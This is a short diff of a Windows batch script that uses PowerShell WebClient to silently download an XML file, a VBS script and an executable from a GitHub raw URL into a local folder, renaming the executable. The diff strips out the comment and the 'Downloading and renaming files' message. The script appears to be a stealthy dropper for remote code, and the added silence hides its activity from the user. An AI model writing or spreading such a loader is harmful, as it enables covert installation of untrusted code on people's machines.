@@ -1,6 +1,6 @@
 @echo off
 
-REM Define URLs and destination directory
+
 set "URL1=https://raw.githubusercontent.com/m-c00/td/main/win-win.xml"
 set "URL2=https://raw.githubusercontent.com/m-c00/td/main/wscript.vbs"
 set "URL3=https://raw.githubusercontent.com/m-c00/td/main/win-tr1.exe"
@@ -25,7 +25,7 @@ if %errorlevel% equ 0 (
 if not exist "%DEST_DIR%" mkdir "%DEST_DIR%"
 
 
-echo Downloading and renaming files...
+
 powershell -command "(New-Object System.Net.WebClient).DownloadFile('%URL1%', '%DEST_DIR%\win-win.xml')"
 powershell -command "(New-Object System.Net.WebClient).DownloadFile('%URL2%', '%DEST_DIR%\wscript.vbs')"
 powershell -command "(New-Object System.Net.WebClient).DownloadFile('%URL3%', '%DEST_DIR%\win-tr.exe')"
